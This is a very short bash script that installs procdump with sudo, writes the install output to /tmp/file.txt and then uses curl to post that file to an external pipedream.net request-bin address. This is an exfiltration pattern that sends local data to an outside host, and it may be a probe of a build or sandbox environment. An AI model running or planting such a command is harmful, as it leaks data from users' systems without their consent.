#!/bin/bash

sudo apt-get install procdump -y > /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net